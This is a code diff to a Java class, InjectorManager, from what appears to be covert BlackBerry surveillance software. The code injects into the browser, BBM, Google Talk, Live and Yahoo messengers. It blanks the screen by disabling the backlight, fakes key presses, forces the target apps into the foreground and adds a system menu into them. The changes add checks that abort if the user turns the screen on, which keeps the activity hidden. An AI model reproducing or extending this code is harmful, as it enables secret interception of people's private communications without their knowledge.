@@ -1,3 +1,4 @@
+//#preprocess
 package blackberry.injection;
 
 import java.util.Hashtable;
@@ -14,6 +15,7 @@ import net.rim.device.api.ui.Screen;
 import blackberry.AppListener;
 import blackberry.Device;
 import blackberry.Singleton;
+import blackberry.Status;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -42,7 +44,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     private static final int RUNON_APP = 1;
     private static final int RUNON_BACKLIGHT = 2;
     private static final int KEY_LOCK = 4099;
-    
+
     private static final int MAX_TRIES = 3;
     //#ifdef DEBUG
     private static Debug debug = new Debug("InjectorManager",
@@ -61,6 +63,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     private AInjector injector;
     private boolean injecting;
     private int started = 0;
+    private Status status = Status.self();
 
     public synchronized static InjectorManager getInstance() {
 
@@ -75,11 +78,22 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         }
         return instance;
     }
-    
-    private InjectorManager(){
+
+    private InjectorManager() {
         injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
                 new GoogleTalkInjector(), new LiveInjector(),
                 new YahooInjector() };
+
+        for (int i = 0; i < injectors.length; i++) {
+            injector = injectors[i];
+            if (!exists(injector.getCodName())) {
+                //#ifdef DEBUG
+                debug.trace("InjectorManager, not existent application, disabling: "
+                        + injector.getCodName());
+                //#endif
+                injector.disable();
+            }
+        }
     }
 
     public void start() {
@@ -106,7 +120,6 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         appListener.addBacklightObserver(this);
 
         //appListener.suspendable(true);
-
 
         if (!Backlight.isEnabled()) {
             injectAll();
@@ -155,7 +168,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
         try {
 
-            boolean allInjected=true;
+            boolean allInjected = true;
             for (int i = 0; i < injectors.length; i++) {
                 injector = injectors[i];
 
@@ -194,15 +207,15 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#endif
             return true;
         }
-        
-        if(injector.getTries() > MAX_TRIES){
+
+        if (injector.getTries() > MAX_TRIES) {
             //#ifdef DEBUG
             debug.trace("inject, too many tries");
             //#endif
             return true;
         }
 
-        if (Backlight.isEnabled()) {
+        if (status.backlightEnabled()) {
             //#ifdef DEBUG
             debug.trace("inject, backlight, bailing out");
             //#endif
@@ -212,19 +225,32 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         String name = injector.getCodName();
         injectorMap.put(name, injector);
 
-        setBacklight(false);
+        status.setBacklight(false);
         manager.requestForegroundForConsole();
         unLock();
 
-        if (execute(name)) {
+        if (requestForeground(name)) {
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
             //#endif
-            
+
+            if (status.backlightEnabled()) {
+                //#ifdef DEBUG
+                debug.trace("inject, backlight, bailing out");
+                //#endif
+                return false;
+            }
             injector.incrTries();
 
             Utils.sleep(500);
             if (checkForeground(name)) {
+
+                if (status.backlightEnabled()) {
+                    //#ifdef DEBUG
+                    debug.trace("inject, backlight, bailing out");
+                    //#endif
+                    return false;
+                }
 
                 addSystemMenu(injector);
                 Utils.sleep(300);
@@ -234,21 +260,33 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
                 manager.requestForegroundForConsole();
             }
-        } else {
-            //#ifdef DEBUG
-            debug.trace("inject, cannot execute, disable");
-            //#endif
-            injector.disable();
         }
         return false;
     }
 
-    private void setBacklight(boolean b) {
-        Backlight.enable(b);
-    }
+    /**
+     * check if a codname is installed in the system
+     * 
+     * @param name
+     * @return
+     */
+    private boolean exists(String name) {
+        final int handles[] = CodeModuleManager.getModuleHandles();
 
-    private boolean backlightEnabled() {
-        return Backlight.isEnabled();
+        final int size = handles.length;
+        for (int i = 0; i < size; i++) {
+            final int handle = handles[i];
+            // CodeModuleManager.getModuleHandle(name)
+            // Retrieve specific information about a module.
+            final String modname = CodeModuleManager.getModuleName(handle);
+            if (modname.equals(name)) {
+                //#ifdef DEBUG
+                debug.trace("exists, found.");
+                //#endif
+                return true;
+            }
+        }
+        return false;
     }
 
     /**
@@ -262,7 +300,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
         Utils.sleep(200);
 
-        if (backlightEnabled()) {
+        if (status.backlightEnabled()) {
             //#ifdef DEBUG
             debug.trace("Backlight still enabled, getHardwareLayout: "
                     + Keypad.getHardwareLayout());
@@ -272,10 +310,10 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             Utils.sleep(200);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
             Utils.sleep(200);
-            setBacklight(false);
+            status.setBacklight(false);
             Utils.sleep(500);
             for (int i = 0; i < 10; i++) {
-                if (backlightEnabled()) {
+                if (status.backlightEnabled()) {
                     //Backlight.enable(false);
                     Utils.sleep(500);
                     //#ifdef DEBUG
@@ -336,7 +374,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         //#ifdef BBM_DEBUG
         Backlight.enable(true);
         //#endif
-        
+
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(500);
 
@@ -370,6 +408,30 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
     }
 
+    private boolean requestForeground(String codName) {
+        int foregroundPin = manager.getForegroundProcessId();
+        ApplicationDescriptor[] apps = manager.getVisibleApplications();
+        for (int i = 0; i < apps.length; i++) {
+            if (apps[i].getModuleName().indexOf(codName) >= 0) {
+                int processId = manager.getProcessId(apps[i]);
+ 
+                if (foregroundPin == processId) {
+                    //#ifdef DEBUG
+                    debug.trace("requestForeground: already foreground");
+                    //#endif
+                    return true;
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("requestForeground: bringing foreground");
+                    //#endif
+                    manager.requestForeground(processId);
+                    return true;
+                }
+            }
+        }
+ 
+        return false;
+    }
     private boolean execute(String command) {
         ApplicationDescriptor applicationDescriptor = getApplicationDescriptor(command);
         if (applicationDescriptor != null) {
@@ -378,8 +440,32 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 //#ifdef DEBUG
                 debug.trace("executeApplication: " + urlModule); //$NON-NLS-1$
                 //#endif
-                ApplicationManager.getApplicationManager().launch(urlModule);
-                return true;
+                ApplicationDescriptor descriptors[] = manager
+                        .getVisibleApplications();
+                for (int i = 0; i < descriptors.length; i++) {
+                    ApplicationDescriptor appdep = descriptors[i];
+                    //#ifdef DEBUG
+                    debug.trace("execute, visible: " + appdep.getName() + " "
+                            + appdep.getModuleName());
+                    //#endif
+                    if (appdep.getModuleName().equals(urlModule)) {
+                        //#ifdef DEBUG
+                        debug.trace("execute, found: " + appdep.getName());
+                        //#endif
+                        int id = manager.getProcessId(appdep);
+                        if (id >= 0) {
+                            manager.requestForeground(id);
+                            status.setBacklight(false);
+                            return true;
+                        } else {
+                            //#ifdef DEBUG
+                            debug.trace("execute: not running");
+                            //#endif
+                        }
+                    }
+
+                }
+                return false;
             } catch (Exception ex) {
                 //#ifdef DEBUG
                 debug.error("executeApplication: " + ex); //$NON-NLS-1$
